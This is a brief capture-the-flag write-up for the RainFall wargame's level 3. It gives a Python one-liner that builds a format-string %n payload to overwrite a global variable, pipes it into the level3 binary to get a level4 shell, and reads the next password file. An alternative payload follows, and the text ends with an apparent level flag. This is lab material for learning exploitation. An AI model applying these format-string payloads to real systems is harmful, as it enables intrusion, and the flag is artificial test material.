# Level 3

```bash
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%x%x%49u%n"' > /var/crash/read
level3@RainFall:~$ cat /var/crash/read | ./level3 
�200b7fd1ac0                                       3086956496
Wait what?!
level3@RainFall:~$ cat /var/crash/read - | ./level3 
�200b7fd1ac0                                       3086956496
Wait what?!
whoami
level4
cat /home/user/level4/.pass
```

## Aurel

```bash
python2 -c 'print "\x8c\x98\x04\x08" + "%x "*3 + "a"*38 + "%n"' > /var/crash/write
```

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
